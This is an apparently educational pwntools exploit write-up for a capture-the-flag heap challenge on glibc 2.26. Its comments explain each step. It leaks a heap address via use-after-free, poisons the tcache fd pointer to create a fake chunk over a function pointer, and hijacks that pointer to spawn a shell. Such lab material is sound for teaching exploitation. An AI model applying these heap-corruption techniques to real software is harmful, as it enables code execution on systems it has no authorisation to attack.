'''
Tcache Fake Fd Challenge writeup:
- Run on GLibC version 2.26
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = '.happy-2.26'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.26/
''') 
else: 
	p = remote(domain, port) 

def get_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", str(name))

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", str(name))
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def see_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

def heap_leak():
	print("Step 1: heap leak")
	print("=================")
	'''
	The main vulnerability is a use-after-free for the kids in the array. 
	This same vulnerability can also be used for a double free scenario.

	With the use after free, we can do the following things: 
	- double free a kid (house of botcake technique) 
	- print the attributes of a kid 
	- edit the kid
	'''

	# Create three kids
	get_kid("Kid#1", 5) # Index 0: Use for UAF later
	get_kid("Kid#2", 6) 
	get_kid("Kid#3", 7) 

	# Free two kids
	free_kid(1) 
	free_kid(0)

	'''
	Each struct looks like the following in memory: 
	8 bytes (age) 
	20 bytes (name) 
	8 bytes (print_info) 

	After freeing, the tcache bin looks like the following: 

	-----------------
	0x30: index0 -> index1
	-----------------

	Once this struct is freed this will go into the tcache bin
	(because of the small size, it goes into the 0x30 tcache).

	Recall that tcache has an fd ptr (in the first part of the 
	data of the chunk) that points to the next tcache chunk...

	So, this means that the first entry of the struct will have a 
	tcache ptr to the next entry (if it's not the last item in the list).
	Additionally, the second item has a pointer to the tcache iself. 
	By using this as a leak, we would only need ONE alloation and UAF. 

	We use the UAF on the kid at index 0 in order to leak a heap address
	(fd of the tcache chunk).
	'''
	name, age = see_kid(0)
	leak = int(age)

	# Subtract offset from heap to find beginning
	leak = leak - 0x2d0 
	print("Leaked heap address...", hex(leak))
	return leak

def fake_chunk(leak):
	print("Step 2: Fake chunk Over Function Ptr")
	print("====================================") 

	'''
	We enter with a UAF on index 0 and index for Kids
	(from previous step). 

	The heap looks like the following: 
	
	--- Index 0 ----
	prev_size: 0x0 
	size: 0x31 (prev_inuse always set on first chunk) 
	--- Index 1 --- 
	pre_size: 0x0
	size: 0x31 
	---------------	

	Currently, the 'kid' at index 0 is freed (and writable). 
	The 'age' field (also the fd pointer of the fastbin) leaks 
	this pointer (done in previous step). 
	
	We can **overwrite** the fd pointer, we can 
	**create** a fake chunk at ANY location.

	Now, what is the best place to create a fake_chunk at? 
		- Function pointer on 'kid' struct
		- __malloc_hook 
		- GOT entries (if not Full RELRO) 

	Unlike fastbins, there is no security check on the size 
	(making it too easy). 
	So, just put a chunk wherever you want! For this demo, 
	we will overwrite a function pointer within the 'kid' 
	struct but there are other options for this. 

	Once we have access to the fake chunk, write over the 
	function pointer to the 'win' function for code execution!
	How does this write actually look? Below: 

	---------------------
	0x0-0x7: prev_size
	0x8-0xf: size 
	0x10-0x17: age 
	0x18-0x37: name buffer <--------------
	0x38-0x3f: func_ptr                  |
	next chunk ...                       | Fake Chunk (at 0x30 offset)
	                                     |
	                       <--------------
	---------------------

	With this setup, the allocation will overlap with the function 
	pointer. By writing a name (second element of the struct) 
	we will have control of the function pointer.
	
	Steps: 
	- Overwrite kid 0's fd pointer to point to fake chunk 
	- Create a fake chunk within one of the kids, that is close 
	to the function pointer. 
	- Get the fake chunk 
	- Write over the function pointer to point to 'win'.
	- Profit :) 


	NOTE: The 'count' struct does NOT work properly in GLibC
	2.26. Because of this, we actually only NEED to allocate 
	one chunk to begin with instead 2. For the purposes of this 
	exploit, we did use this part of 2.26 because of the leak 
	required eariler on. In 2.29, this was fixed. 
	'''

	''' 
	Overwrite the fd pointer of the tcache chunk to point to 
	the fake_chunk (created in the previous line). 

	The offset is different than fastbins because the tcache bins 
	itself are inside of a 0x290) malloc allocation. 
	'''
	tcache_chunk_offset = 0x290 # Size of the tcache chunk
	fake_chunk_offset = 0x30 # Align 'age' of new fd with 'func_ptr'
	fake_chunk_ptr = leak + tcache_chunk_offset + fake_chunk_offset
	edit_kid(0, "?", fake_chunk_ptr) # Set the fake fd

	'''
	The fake chunk is in the SECOND slot of the linked list. 
	So, in order to get chunk, we need to take an item out first. 
	'''
	print("Remove chunk at beginning of tcache linked list")
	get_kid("A" * 8, 1)


# FOR THE WIN
def win():

	'''
	The next chunk that comes out of the 0x30 tcache bin 
	will be our fake chunk! 

	The call to 'get_kid' below triggers this! During this 
	step, we overwrite the 'func_ptr' at index 0 with the 
	'win' function to pop a shell. 
	'''
	# Get the fake_chunk (at the top of the tcache)
	print("Get the fake chunk") 
	print("Write over func_ptr with the 'win' function!") 
	get_kid("PWNED!", elf.symbols['win'])
	#get_kid(p64(elf.symbols['win']), 2) <-- To write with 'name'

	print("Pop shell!")
	# Print kid info option
	p.sendlineafter('>', '2') 

	# Index 1 has the overwritten function pointer. Pwned :)
	p.sendlineafter(':', '0') 


leak = heap_leak() 
fake_chunk(leak) 
win()
p.interactive()

